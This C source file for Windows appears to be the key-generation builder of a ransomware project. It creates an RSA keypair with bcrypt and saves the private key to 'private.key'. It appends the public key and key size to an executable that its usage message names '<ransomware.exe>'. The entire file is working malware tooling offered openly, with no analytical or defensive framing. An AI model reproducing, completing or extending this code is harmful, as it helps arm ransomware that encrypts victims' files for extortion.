#include <windows.h>

#include "util.h"
#include "crypt.h"

/* key to file */
void
ktof(HINSTANCE *hinst, Keypair *k, short unsigned int *blobtype, const char *filename, const char *fmode)
{
	FILE *f;

	ktob(hinst, k, blobtype);
	/* Write to file */
	if (!(f = fopen(filename, fmode)))
		die("Failed to fopen");
	if (!fwrite(k->blob, 1, k->size, f))
		die("Failed to fwrite");
	fclose(f);
	free(k->blob);

	printf("Wrote %lu bytes to %s\n", k->size, filename);
}

int
main(int argc, char **argv)
{
	if (argc < 2) {
		fprintf(stderr, "usage: %s <ransomware.exe>", argv[0]);
		return 1;
	}

	HINSTANCE hinst;
	HANDLE rs;
	FILE *f;
	Keypair *k;

	if (!(hinst = LoadLibrary("bcrypt.dll")))
		die("Failed to load bcrypt.dll");
	/* malloc struct */
	if (!(k = malloc(sizeof(Keypair))))
		die("Failed to malloc Keypair struct");
	rsa_gen_key(&hinst, k);
	/* Write private key to file */
	ktof(&hinst, k, BCRYPT_RSAPRIVATE_BLOB, "private.key", "wb");
	ktof(&hinst, k, BCRYPT_RSAPUBLIC_BLOB, argv[1], "ab");
	/* Write keysize to file */
	if (!(f = fopen(argv[1], "ab")))
		die("Failed to fopen");
	if (!fwrite(&(k->size), 1, sizeof(unsigned), f))
		die("Failed to fwrite");
	fclose(f);

	/* BCryptDestroyKey */
	if (adrof(hinst, "BCryptDestroyKey")(k->khandle))
		die("Failed to BCryptDestroyKey");

	FreeLibrary(hinst);
}

